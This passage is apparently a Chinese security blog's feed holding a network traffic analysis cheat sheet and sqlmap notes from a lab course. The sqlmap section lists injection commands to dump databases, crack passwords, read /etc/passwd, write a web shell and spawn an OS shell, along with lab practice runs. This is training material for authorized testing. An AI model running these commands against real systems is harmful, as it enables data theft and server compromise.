    <content type="html"><![CDATA[<p>网络流量分析（NTA）可以被描述为检查网络流量的行为，以表征所使用的公共端口和协议，为我们的环境建立基线，监控和应对威胁，并确保对我们组织的网络有最大可能的了解。</p><span id="more"></span><h1 id="备忘单"><a href="#备忘单" class="headerlink" title="备忘单"></a>备忘单</h1><p>请记住，除非您使用 root，否则执行任何需要绑定网络接口或将其设置为混杂模式的应用程序都需要权限。<code>sudo</code></p><h2 id="无机连接信息"><a href="#无机连接信息" class="headerlink" title="无机连接信息"></a>无机连接信息</h2><ul><li>目标 IP &#x3D;&#x3D; 10.129.43.4</li></ul><h2 id="Tcpdump"><a href="#Tcpdump" class="headerlink" title="Tcpdump"></a>Tcpdump</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>tcpdump --version</code></td><td>打印 tcpdump 和 libpcap 版本字符串，然后退出。</td></tr><tr><td><code>tcpdump -h</code></td><td>打印帮助和使用信息。</td></tr><tr><td><code>tcpdump -D</code></td><td>打印 tcpdump 可以从中捕获的可用网络接口的列表。</td></tr><tr><td><code>tcpdump -i (interface name or #)</code></td><td>执行 tcpdump 并利用指定的要捕获的接口。</td></tr><tr><td><code>tcpdump -i (int) -w file.pcap</code></td><td>在指定的接口上运行捕获并将输出写入文件。</td></tr><tr><td><code>tcpdump -r file.pcap</code></td><td>TCPDump 将从指定的文件中读取输出。</td></tr><tr><td><code>tcpdump -r/-w file.pcap -l | grep &#39;string&#39;</code></td><td>TCPDump 将利用来自实时捕获或文件的捕获流量，并将标准输出设置为行缓冲。然后，我们可以利用管道 （|） 将该输出发送到其他工具（如 grep）以查找字符串或特定模式。</td></tr><tr><td><code>tcpdump -i (int) host (ip)</code></td><td>TCPDump 将在 （int） 指定的接口上启动捕获，并且仅捕获源自或发往 之后指定的 IP 地址或主机名的流量。<code>host</code></td></tr><tr><td><code>tcpdump -i (int) port (#)</code></td><td>将筛选捕获中来自或发往端口 （#） 的任何内容，并丢弃其余内容。</td></tr><tr><td><code>tcpdump -i (int) proto (#)</code></td><td>将筛选捕获以查找与 （#） 匹配的任何协议流量。例如，（6） 将过滤任何 TCP 流量并丢弃其余流量。</td></tr><tr><td><code>tcpdump -i (int) (proto name)</code></td><td>将利用协议公用名来过滤捕获的流量。以TCP&#x2F;UDP&#x2F;ICMP为例。</td></tr></tbody></table><hr><h2 id="Tcpdump-通用开关和过滤器"><a href="#Tcpdump-通用开关和过滤器" class="headerlink" title="Tcpdump 通用开关和过滤器"></a>Tcpdump 通用开关和过滤器</h2><table><thead><tr><th><strong>开关&#x2F;滤波器</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>D</code></td><td>将显示可从中捕获的任何接口。</td></tr><tr><td><code>i</code></td><td>选择要从中捕获的接口。例如 -i eth0</td></tr><tr><td><code>n</code></td><td>不要解析主机名。</td></tr><tr><td><code>nn</code></td><td>不要解析主机名或已知端口。</td></tr><tr><td><code>e</code></td><td>将获取以太网标头以及上层数据。</td></tr><tr><td><code>X</code></td><td>以十六进制和 ASCII 显示数据包的内容。</td></tr><tr><td><code>XX</code></td><td>与 X 相同，但也会指定以太网标头。（如使用 Xe）</td></tr><tr><td><code>v, vv, vvv</code></td><td>增加显示和保存的输出的详细程度。</td></tr><tr><td><code>c</code></td><td>获取特定数量的数据包，然后退出程序。</td></tr><tr><td><code>s</code></td><td>定义要抓取的数据包量。</td></tr><tr><td><code>S</code></td><td>将捕获显示中的相对序列号更改为绝对序列号。（13248765839而不是 101）</td></tr><tr><td><code>q</code></td><td>打印更少的协议信息。</td></tr><tr><td><code>r file.pcap</code></td><td>从文件中读取。</td></tr><tr><td><code>w file.pcap</code></td><td>写入文件</td></tr><tr><td><code>host</code></td><td>主机将过滤可见流量以显示涉及指定主机的任何内容。双向</td></tr><tr><td><code>src / dest</code></td><td><code>src</code>并且是修饰符。我们可以使用它们来指定源或目标主机或端口。<code>dest</code></td></tr><tr><td><code>net</code></td><td><code>net</code>将向我们显示来自或发往指定网络的任何流量。它使用&#x2F;符号。</td></tr><tr><td><code>proto</code></td><td>将筛选特定的协议类型。（以ether，TCP，UDP和ICMP为例）</td></tr><tr><td><code>port</code></td><td><code>port</code>是双向的。它将显示将指定端口作为源或目标的任何流量。</td></tr><tr><td><code>portrange</code></td><td><code>Portrange</code>允许我们指定端口范围。(0-1024)</td></tr><tr><td><code>less / greater &quot;&lt; &gt;&quot;</code></td><td><code>less</code>并可用于查找特定大小的数据包或协议选项。<code>greater</code></td></tr><tr><td><code>and / &amp;&amp;</code></td><td><code>and</code> <code>&amp;&amp;</code>可用于将两个不同的筛选器连接在一起。例如，SRC 主机和端口。</td></tr><tr><td><code>or</code></td><td><code>or</code>或者允许在两个条件中的任何一个上进行匹配。它不必同时满足两者。这可能很棘手。</td></tr><tr><td><code>not</code></td><td><code>not</code>是一个修饰符，表示除 x 以外的任何内容。例如，不是 UDP。</td></tr></tbody></table><hr><h2 id="沙克"><a href="#沙克" class="headerlink" title="沙克"></a>沙克</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>tshark -h</code></td><td>打印帮助菜单。</td></tr><tr><td><code>tshark -D</code></td><td>列出要从中捕获的可用接口。</td></tr><tr><td><code>tshark -i (int)</code></td><td>在所选接口上捕获。将 （int） 替换为接口名称或编号。</td></tr><tr><td><code>tshark -i eth0 -f &quot;host (ip)&quot;</code></td><td>使用 tshark 时应用带有 （-f） 的过滤器以查找特定主机</td></tr><tr><td><code>D</code></td><td>将显示可从中捕获然后退出的任何接口。</td></tr><tr><td><code>L</code></td><td>将列出您可以从中捕获然后退出的链接层介质。（以以太网为例）</td></tr><tr><td><code>i</code></td><td>选择要从中捕获的接口。（-i eth0）</td></tr><tr><td><code>f</code></td><td>libpcap 语法中的数据包过滤器。在捕获期间使用。</td></tr><tr><td><code>c</code></td><td>获取特定数量的数据包，然后退出程序。定义停止条件。</td></tr><tr><td><code>a</code></td><td>定义自动停止条件。它可以是在持续时间、特定文件大小或一定数量的数据包之后。</td></tr><tr><td><code>r (pcap-file)</code></td><td>从文件中读取。</td></tr><tr><td><code>W (pcap-file)</code></td><td>使用 pcapng 格式写入文件。</td></tr><tr><td><code>P</code></td><td>写入文件时将打印数据包摘要 （-W）</td></tr><tr><td><code>x</code></td><td>会将十六进制和 ASCII 输出添加到捕获中。</td></tr><tr><td><code>h</code></td><td>查看帮助菜单</td></tr></tbody></table><hr><h2 id="线鲨"><a href="#线鲨" class="headerlink" title="线鲨"></a>线鲨</h2><table><thead><tr><th><strong>捕获筛选器</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>host x.x.x.x</code></td><td>仅捕获与特定主机相关的流量</td></tr><tr><td><code>net x.x.x.x/24</code></td><td>捕获进出特定网络的流量（使用斜杠表示法指定掩码）</td></tr><tr><td><code>src/dst net x.x.x.x/24</code></td><td>使用 src 或 dst 网络将仅捕获来自指定网络或发往目标网络的流量来源</td></tr><tr><td><code>port #</code></td><td>将过滤掉除您指定的端口之外的所有流量</td></tr><tr><td><code>not</code></td><td>将捕获除指定变量之外的所有内容。前任。<code>not port 80</code></td></tr><tr><td><code>and</code></td><td>AND 将连接您指定的端口。前任。<code>host 192.168.1.1 and port 80</code></td></tr><tr><td><code>portrange x-x</code></td><td>端口范围将仅从范围内的所有端口获取流量</td></tr><tr><td><code>ip / ether / tcp</code></td><td>这些过滤器将仅从指定的协议标头中获取流量。</td></tr><tr><td><code>broadcast / multicast / unicast</code></td><td>获取特定类型的流量。一对一、一对多或一对全部。</td></tr></tbody></table><table><thead><tr><th><strong>显示筛选器</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>ip.addr == x.x.x.x</code></td><td>仅捕获与特定主机相关的流量。这是一个 OR 语句。</td></tr><tr><td><code>ip.addr == x.x.x.x/24</code></td><td>捕获与特定网络相关的流量。这是一个 OR 语句。</td></tr><tr><td><code>ip.src/dst == x.x.x.x</code></td><td>捕获进出特定主机的流量。</td></tr><tr><td><code>dns / tcp / ftp / arp / ip</code></td><td>按特定协议过滤流量。还有更多选择。</td></tr><tr><td><code>tcp.port == x</code></td><td>按特定 TCP 端口进行筛选。</td></tr><tr><td><code>src.port / dst.port ==x</code></td><td>将捕获除指定端口之外的所有内容。</td></tr><tr><td><code>and / or / not</code></td><td>AND 将连接，OR 将找到两个选项中的任何一个，NOT 将排除您的输入选项。</td></tr><tr><td><code>tcp.stream eq #</code></td><td>允许我们跟踪捕获整个流的 tcp 会话。将 （#） 替换为要重新组合的会话。</td></tr><tr><td><code>http</code></td><td>将过滤与 http 协议匹配的任何流量。</td></tr><tr><td><code>http &amp;&amp; image-jfif</code></td><td>此过滤器将显示带有 jpeg 图像文件的任何数据包。</td></tr><tr><td><code>ftp</code></td><td>FTP 协议的筛选器。</td></tr><tr><td><code>ftp.request.command</code></td><td>将过滤通过 ftp 控制通道发送的任何控制命令。</td></tr><tr><td><code>ftp-data</code></td><td>将显示通过 ftp 传输的任何对象。</td></tr></tbody></table><hr><h2 id="杂项命令"><a href="#杂项命令" class="headerlink" title="杂项命令"></a>杂项命令</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>sudo *</code></td><td>Sudo 将运行以提升的权限继续执行的命令。</td></tr><tr><td><code>which (application)</code></td><td>利用 来确定主机上是否安装了（应用程序）。将应用程序替换为您要查找的内容。前任。<code>which tcpdump</code></td></tr><tr><td><code>sudo apt install (application)</code></td><td>使用提升的权限安装应用程序包（如果主机上不存在应用程序包）。前任。<code>sudo apt install wireshark</code></td></tr><tr><td><code>man (application)</code></td><td>显示应用程序的手册页。前任。。<code>man tcpdump</code></td></tr></tbody></table><h4 id="Common-Traffic-Analysis-Tools"><a href="#Common-Traffic-Analysis-Tools" class="headerlink" title="Common Traffic Analysis Tools"></a>Common Traffic Analysis Tools</h4><table><thead><tr><th><strong>Tool</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>tcpdump</code></td><td><a href="https://www.tcpdump.org/">tcpdump</a> is a command-line utility that, with the aid of LibPcap, captures and interprets network traffic from a network interface or capture file.</td></tr><tr><td><code>Tshark</code></td><td><a href="https://www.wireshark.org/docs/man-pages/tshark.html">TShark</a> is a network packet analyzer much like TCPDump. It will capture packets from a live network or read and decode from a file. It is the command-line variant of Wireshark.</td></tr><tr><td><code>Wireshark</code></td><td><a href="https://www.wireshark.org/">Wireshark</a> is a graphical network traffic analyzer. It captures and decodes frames off the wire and allows for an in-depth look into the environment. It can run many different dissectors against the traffic to characterize the protocols and applications and provide insight into what is happening.</td></tr><tr><td><code>NGrep</code></td><td><a href="https://github.com/jpr5/ngrep">NGrep</a> is a pattern-matching tool built to serve a similar function as grep for Linux distributions. The big difference is that it works with network traffic packets. NGrep understands how to read live traffic or traffic from a PCAP file and utilize regex expressions and BPF syntax. This tool shines best when used to debug traffic from protocols like HTTP and FTP.</td></tr><tr><td><code>tcpick</code></td><td><a href="http://tcpick.sourceforge.net/index.php?p=home.inc">tcpick</a> is a command-line packet sniffer that specializes in tracking and reassembling TCP streams. The functionality to read a stream and reassemble it back to a file with tcpick is excellent.</td></tr><tr><td><code>Network Taps</code></td><td>Taps (<a href="https://www.gigamon.com/">Gigamon</a>, <a href="https://www.niagaranetworks.com/products/network-tap">Niagra-taps</a>) are devices capable of taking copies of network traffic and sending them to another place for analysis. These can be in-line or out of band. They can actively capture and analyze the traffic directly or passively by putting the original packet back on the wire as if nothing had changed.</td></tr><tr><td><code>Networking Span Ports</code></td><td><a href="https://en.wikipedia.org/wiki/Port_mirroring">Span Ports</a> are a way to copy frames from layer two or three networking devices during egress or ingress processing and send them to a collection point. Often a port is mirrored to send those copies to a log server.</td></tr><tr><td><code>Elastic Stack</code></td><td>The <a href="https://www.elastic.co/elastic-stack">Elastic Stack</a> is a culmination of tools that can take data from many sources, ingest the data, and visualize it, to enable searching and analysis of it.</td></tr><tr><td><code>SIEMS</code></td><td><code>SIEMS</code> (such as <a href="https://www.splunk.com/en_us">Splunk</a>) are a central point in which data is analyzed and visualized. Alerting, forensic analysis, and day-to-day checks against the traffic are all use cases for a SIEM.</td></tr></tbody></table><h2 id="OSI-x2F-TCP-IP-Models"><a href="#OSI-x2F-TCP-IP-Models" class="headerlink" title="OSI &#x2F; TCP-IP Models"></a>OSI &#x2F; TCP-IP Models</h2><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307151216143.png" alt="image"></p><p>在整个模块中，我们将研究许多不同的协议数据单元（PDU），因此需要对其在理论上和线路上的表现进行功能性理解。PDU是由控制信息和从OSI模型的每一层封装的数据组成的数据包。下面的分组显示两个模型中的层如何与PDU匹配。</p><h4 id="PDU-Example"><a href="#PDU-Example" class="headerlink" title="PDU Example"></a>PDU Example</h4><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307151220699.png" alt="image"></p><p>在检查PDU时，我们需要牢记封装的概念。当我们的数据在协议栈中向下移动时，每一层都会将前一层的数据封装在一个新的气泡中，我们称之为封装。该气泡将该层的必要信息添加到PDU的报头中。这些信息可能因级别而异，但它包括前一层所持有的内容、操作标志、协商通信所需的任何选项、源和目标IP地址、端口、传输以及应用层协议。</p><h4 id="PDU-Packet-Breakdown"><a href="#PDU-Packet-Breakdown" class="headerlink" title="PDU Packet Breakdown"></a>PDU Packet Breakdown</h4><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307151222900.png" alt="image"  /><p>上图显示了一个PDU的组成，与Wireshark的“数据包详细信息”窗格中的数据包分组并排。请注意，当我们在Wireshark中看到突破时，它的顺序是相反的。Wireshark以相反的方式向我们显示PDU，因为它的顺序是未封装的。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;网络流量分析（NTA）可以被描述为检查网络流量的行为，以表征所使用的公共端口和协议，为我们的环境建立基线，监控和应对威胁，并确保对我们组织的网络有最大可能的了解。&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
    <category term="tool" scheme="https://taninluv.github.io/tags/tool/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap</title>
    <link href="https://taninluv.github.io/2023/07/14/sqlmap/"/>
    <id>https://taninluv.github.io/2023/07/14/sqlmap/</id>
    <published>2023-07-14T01:52:25.000Z</published>
    <updated>2023-07-15T02:51:41.271Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GET-x2F-POST-Requests"><a href="#GET-x2F-POST-Requests" class="headerlink" title="GET&#x2F;POST Requests"></a>GET&#x2F;POST Requests</h2><p>在最常见的场景中，GET参数使用选项-u&#x2F;-url提供，如前一个示例所示。对于测试POST数据，可以使用–data标志，如下所示：</p><span id="more"></span><h5 id="备忘单"><a href="#备忘单" class="headerlink" title="备忘单"></a>备忘单</h5><p>备忘单是此模块的有用命令参考。</p><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>sqlmap -h</code></td><td>查看基本帮助菜单</td></tr><tr><td><code>sqlmap -hh</code></td><td>查看高级帮助菜单</td></tr><tr><td><code>sqlmap -u &quot;http://www.example.com/vuln.php?id=1&quot; --batch</code></td><td>在不要求用户输入的情况下运行<code>SQLMap</code></td></tr><tr><td><code>sqlmap &#39;http://www.example.com/&#39; --data &#39;uid=1&amp;name=test&#39;</code></td><td><code>SQLMap</code>带有开机自检请求</td></tr><tr><td><code>sqlmap &#39;http://www.example.com/&#39; --data &#39;uid=1*&amp;name=test&#39;</code></td><td>指定带星号的注入点的 POST 请求</td></tr><tr><td><code>sqlmap -r req.txt</code></td><td>将 HTTP 请求文件传递给<code>SQLMap</code></td></tr><tr><td><code>sqlmap ... --cookie=&#39;PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c&#39;</code></td><td>指定 Cookie 标头</td></tr><tr><td><code>sqlmap -u www.target.com --data=&#39;id=1&#39; --method PUT</code></td><td>指定 PUT 请求</td></tr><tr><td><code>sqlmap -u &quot;http://www.target.com/vuln.php?id=1&quot; --batch -t /tmp/traffic.txt</code></td><td>将流量存储到输出文件</td></tr><tr><td><code>sqlmap -u &quot;http://www.target.com/vuln.php?id=1&quot; -v 6 --batch</code></td><td>指定详细级别</td></tr><tr><td><code>sqlmap -u &quot;www.example.com/?q=test&quot; --prefix=&quot;%&#39;))&quot; --suffix=&quot;-- -&quot;</code></td><td>指定前缀或后缀</td></tr><tr><td><code>sqlmap -u www.example.com/?id=1 -v 3 --level=5</code></td><td>指定级别和风险</td></tr><tr><td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --banner --current-user --current-db --is-dba</code></td><td>基本数据库枚举</td></tr><tr><td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --tables -D testdb</code></td><td>表枚举</td></tr><tr><td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --dump -T users -D testdb -C name,surname</code></td><td>表&#x2F;行枚举</td></tr><tr><td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --dump -T users -D testdb --where=&quot;name LIKE &#39;f%&#39;&quot;</code></td><td>条件枚举</td></tr><tr><td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --schema</code></td><td>数据库架构枚举</td></tr><tr><td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --search -T user</code></td><td>搜索数据</td></tr><tr><td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --passwords --batch</code></td><td>密码枚举和破解</td></tr><tr><td><code>sqlmap -u &quot;http://www.example.com/&quot; --data=&quot;id=1&amp;csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE&quot; --csrf-token=&quot;csrf-token&quot;</code></td><td>反 CSRF 令牌绕过</td></tr><tr><td><code>sqlmap --list-tampers</code></td><td>列出所有篡改脚本</td></tr><tr><td><code>sqlmap -u &quot;http://www.example.com/case1.php?id=1&quot; --is-dba</code></td><td>检查 DBA 权限</td></tr><tr><td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --file-read &quot;/etc/passwd&quot;</code></td><td>读取本地文件</td></tr><tr><td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --file-write &quot;shell.php&quot; --file-dest &quot;/var/www/html/shell.php&quot;</code></td><td>写入文件</td></tr><tr><td><code>sqlmap -u &quot;http://www.example.com/?id=1&quot; --os-shell</code></td><td>生成操作系统外壳</td></tr></tbody></table><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap &#39;http://www.example.com/&#39; --data &#39;uid=1&amp;name=test&#39;</code></pre><p>在这种情况下，POST参数uid和name将针对SQLi漏洞进行测试。例如，如果我们有一个明确的指示，表明参数uid容易出现SQLi漏洞，我们可以使用-p uid将测试范围缩小到仅此参数。否则，我们可以使用特殊标记*在提供的数据中进行标记，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap &#39;http://www.example.com/&#39; --data &#39;uid=1*&amp;name=test&#39;</code></pre><p>如果我们需要指定一个复杂的HTTP请求，该请求具有许多不同的头值和一个细长的POST主体，我们可以使用-r标志。有了这个选项，SQLMap就有了“请求文件”，将整个HTTP请求包含在一个文本文件中。在一种常见的场景中，可以从专用代理应用程序（例如Burp）中捕获此类HTTP请求，并将其写入请求文件。</p><p>提示：与’–data’选项类似，在保存的请求文件中，我们可以用星号（*）指定要注入的参数，例如’&#x2F;？id&#x3D;*’。</p><p>如果我们想指定一种替代HTTP方法，而不是GET和POST（例如PUT），我们可以使用选项–method，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u www.target.com --data=&#39;id=1&#39; --method PUT</code></pre><h2 id="Custom-HTTP-Requests"><a href="#Custom-HTTP-Requests" class="headerlink" title="Custom HTTP Requests"></a>Custom HTTP Requests</h2><p>除了最常见的表单数据POST主体样式（例如id&#x3D;1）外，SQLMap还支持JSON格式（例如｛“id”:1｝）和XML格式（例如<element><id>1</id></element>）的HTTP请求。 对这些格式的支持是以一种“宽松”的方式实现的；因此，对于参数值如何存储在内部没有严格的约束。如果POST正文相对简单而简短，那么选项–data就足够了。 但是，在POST主体复杂或较长的情况下，我们可以再次使用-r选项</p><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><blockquote><p>target:94.237.62.6:35238</p></blockquote><p><strong>What’s the contents of table flag2? (Case #2 POST parameter)</strong></p><pre><code>sqlmap -u http://94.237.62.6:35238/case2.php --data=&#39;id=*&#39; --batch --dump</code></pre><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307141052194.png" alt="image-20230714105227130"></p><p><strong>What’s the contents of table flag3? (Case #3 Cookie value)</strong></p><pre><code>sqlmap -u http://94.237.62.6:35238/case2.php  --cookie=&#39;id=*&#39; --batch --dump</code></pre><p>这里要注意请求方式变成了get，以及cookie里的参数后面要加一个<code>*</code>不然会显示没有提供参数,（应该相当于在<code>*</code>位置FUZZ所以是否保留参数需要考虑）。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307141122747.png" alt="image-20230714112217706"></p><p> <strong>What’s the contents of table flag4? (Case #4 JSON value)</strong></p><p>这里抓包之后发现json是附在请求末尾：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307141118987.png" alt="image-20230714111845937"></p><p>那么应该不用每次都抓包也能写出一个payload文档</p><pre><code>sqlmap -r test.txt -p id --batch --dump -D testdb -T flag4</code></pre><p>按照示例给的跑实在太慢了动辄十来分钟(后一节的内容都看完了)，还是稍微手工一下，指定更多的参数去找flag</p><h1 id="Handling-SQLMap-Errors"><a href="#Handling-SQLMap-Errors" class="headerlink" title="Handling SQLMap Errors"></a>Handling SQLMap Errors</h1><h2 id="Display-Errors"><a href="#Display-Errors" class="headerlink" title="Display Errors"></a>Display Errors</h2><p>第一步通常是切换–parse-errors，解析DBMS错误（如果有的话），并将其显示为程序运行的一部分：</p><pre><code class="shell-session">...SNIP...[16:09:20] [INFO] testing if GET parameter &#39;id&#39; is dynamic[16:09:20] [INFO] GET parameter &#39;id&#39; appears to be dynamic[16:09:20] [WARNING] parsed DBMS error message: &#39;SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;))&quot;&#39;,),)((&#39; at line 1&#39;&quot;[16:09:20] [INFO] heuristic (basic) test shows that GET parameter &#39;id&#39; might be injectable (possible DBMS: &#39;MySQL&#39;)[16:09:20] [WARNING] parsed DBMS error message: &#39;SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;YzDZJELylInm&#39; at line 1&#39;...SNIP...</code></pre><h2 id="Store-the-Traffic"><a href="#Store-the-Traffic" class="headerlink" title="Store the Traffic"></a>Store the Traffic</h2><p>-t选项将整个流量内容存储到一个输出文件中：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.target.com/vuln.php?id=1&quot; --batch -t /tmp/traffic.txt</code></pre><p>正如我们从上面的输出中看到的，&#x2F;tmp&#x2F;traffic.txt文件现在包含所有发送和接收的HTTP请求。因此，我们现在可以手动调查这些请求，看看问题发生在哪里。</p><h2 id="Verbose-Output"><a href="#Verbose-Output" class="headerlink" title="Verbose Output"></a>Verbose Output</h2><p>另一个有用的标志是-v选项，它提高了控制台输出的详细程度：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.target.com/vuln.php?id=1&quot; -v 6 --batch</code></pre><h2 id="Using-Proxy"><a href="#Using-Proxy" class="headerlink" title="Using Proxy"></a>Using Proxy</h2><p>最后，我们可以使用–proxy选项通过（MiTM）代理（例如Burp）重定向整个流量。这将通过Burp路由所有SQLMap流量，以便我们稍后可以手动调查所有请求，重复它们，并利用Burp的所有功能处理这些请求</p><h1 id="Attack-Tuning"><a href="#Attack-Tuning" class="headerlink" title="Attack Tuning"></a>Attack Tuning</h1><p>在大多数情况下，SQLMap应该随提供的目标详细信息一起开箱即用。尽管如此，仍有一些选项可以微调SQLi注入尝试，以帮助SQLMap进入检测阶段。发送到目标的每个有效载荷包括： vector（例如，UNION ALL SELECT 1,2，VERSION（））：有效负载的中心部分，承载要在目标上执行的有用SQL代码。 边界（例如<code>&lt;vector&gt;-- - </code>）：前缀和后缀形式，用于将向量正确注入易受攻击的SQL语句。</p><h2 id="Prefix-x2F-Suffix"><a href="#Prefix-x2F-Suffix" class="headerlink" title="Prefix&#x2F;Suffix"></a>Prefix&#x2F;Suffix</h2><p>在极少数情况下，需要特殊的前缀和后缀值，常规SQLMap运行不包括这些值。 对于这样的运行，选项–prefix和–suffix可以按如下方式使用：</p><pre><code class="bash">sqlmap -u &quot;www.example.com/?q=test&quot; --prefix=&quot;%&#39;))&quot; --suffix=&quot;-- -&quot;</code></pre><h2 id="Level-x2F-Risk"><a href="#Level-x2F-Risk" class="headerlink" title="Level&#x2F;Risk"></a>Level&#x2F;Risk</h2><p>默认情况下，SQLMap结合了一组预定义的最常见的边界（即前缀&#x2F;后缀对），以及在易受攻击的目标情况下成功几率很高的向量。尽管如此，用户还是有可能使用更大的边界和向量集，这些边界和向量已经合并到SQLMap中。 对于此类需求，应使用选项–级别和–风险： 选项–level（1-5，默认为1）根据成功的预期（即，预期越低，级别越高）扩展了所使用的向量和边界。 选项–risk（1-3，默认值1）根据在目标端造成问题的风险（即数据库条目丢失或拒绝服务的风险）扩展所使用的向量集。 对于不同的–level和–risk值，检查使用的边界和有效载荷之间的差异的最佳方法是使用-v选项来设置详细级别。在详细程度3或更高（例如-v 3）中，将显示包含所用[PAYLOAD]的消息</p><h2 id="Advanced-Tuning"><a href="#Advanced-Tuning" class="headerlink" title="Advanced Tuning"></a>Advanced Tuning</h2><h4 id="Status-Codes"><a href="#Status-Codes" class="headerlink" title="Status Codes"></a>Status Codes</h4><p>例如，当处理具有大量动态内容的巨大目标响应时，TRUE和FALSE响应之间的细微差异可以用于检测目的。如果在HTTP代码中可以看到TRUE和FALSE响应之间的差异（例如，TRUE为200，FALSE为500），则选项–code可以用于将TRUE响应的检测固定到特定的HTTP代码（例如–code&#x3D;200）。</p><h4 id="Titles"><a href="#Titles" class="headerlink" title="Titles"></a>Titles</h4><p>如果通过检查HTTP页面标题可以看到响应之间的差异，则开关–title可以用于指示检测机制基于HTML标记<title>的内容进行比较。</p><h4 id="Strings"><a href="#Strings" class="headerlink" title="Strings"></a>Strings</h4><p>如果某个特定字符串值出现在TRUE响应中（例如成功），而在FALSE响应中不存在，则选项–string可用于仅根据该单个值的出现来固定检测（例如–string&#x3D;成功）。</p><h4 id="Text-only"><a href="#Text-only" class="headerlink" title="Text-only"></a>Text-only</h4><p>当处理许多隐藏的内容时，例如某些HTML页面行为标签（例如＜script＞、＜style＞、＜meta＞等），我们可以使用–text only开关，它删除所有HTML标签，并仅基于文本（即可见）内容进行比较。</p><h4 id="Techniques"><a href="#Techniques" class="headerlink" title="Techniques"></a>Techniques</h4><p>在某些特殊情况下，我们不得不将使用的有效载荷缩小到特定类型。例如，如果基于时间的盲有效载荷以响应超时的形式引起了麻烦，或者如果我们想强制使用特定的SQLi有效载荷类型，选项-技术可以指定要使用的SQLi技术。 例如，如果我们想跳过基于时间的盲和堆叠SQLi有效载荷，只测试基于布尔的盲、基于错误和UNION查询有效载荷，我们可以使用–technique&#x3D;BEU指定这些技术。</p><h4 id="UNION-SQLi-Tuning"><a href="#UNION-SQLi-Tuning" class="headerlink" title="UNION SQLi Tuning"></a>UNION SQLi Tuning</h4><p>在某些情况下，UNIONSQLi有效负载需要额外的用户提供的信息才能工作。如果我们可以手动找到易受攻击的SQL查询的确切列数，我们可以通过选项–union cols（例如–union cols&#x3D;17）将这个数字提供给SQLMap。如果SQLMap使用的默认“伪”填充值（NULL和随机整数）与易受攻击的SQL查询结果中的值不兼容，我们可以指定一个替代值（例如–union char&#x3D;’a’）。 此外，如果需要在UNION查询的末尾以FROM＜table＞的形式使用附录（例如，在Oracle的情况下），我们可以使用选项–UNION-FROM（例如–UNION-FROM&#x3D;users）来设置它。 未能自动使用正确的FROM附录可能是由于无法在使用前检测DBMS名称。</p><h2 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h2><p><strong>What’s the contents of table flag5? (Case #5 OR SQLi)</strong></p><pre><code>sqlmap -u http://94.237.62.6:33702/case5.php?id=1  -D testdb -T flag5 --dump --risk=3 --level=5 --batch</code></pre><p>强度不够用到的技术回显所有测试都无法注入，把强度提到最高</p><p>但是这里要增加一个<code>--no-cast</code>来禁用类型转换，不然可能得到不准确的结果</p><blockquote><p>在sqlmap中，<code>--no-cast</code> 选项用于禁用类型转换。类型转换是sqlmap在进行注入测试时尝试将数据转换为不同类型的一种技术。</p><p>当执行注入测试时，sqlmap会尝试通过将注入数据转换为不同类型来绕过目标网站的防御机制。这包括将字符串转换为数字、布尔值等。这种类型转换可以帮助sqlmap绕过一些简单的过滤或防御措施，以发现更深入的注入漏洞。</p><p>然而，在某些情况下，类型转换可能导致误报或产生不准确的结果。如果您希望禁用类型转换，可以使用 <code>--no-cast</code> 选项。通过使用该选项，sqlmap将不会尝试进行任何类型转换，而是将数据保持原始的注入形式。</p><p>以下是使用 <code>--no-cast</code> 选项的示例命令：</p><pre><code class="shell">sqlmap -u &lt;目标URL&gt; --no-cast</code></pre><p>请注意，禁用类型转换可能会限制sqlmap的能力来绕过某些防御机制。使用 <code>--no-cast</code> 选项时，需要仔细评估目标系统的情况，并确保测试的结果准确性和完整性。在进行任何安全测试时，请确保您已经获得适当的授权，并遵守法律和道德准则。</p></blockquote><p><strong>What’s the contents of table flag6? (Case #6 Non-standard boundaries)</strong></p><pre><code>sqlmap -u 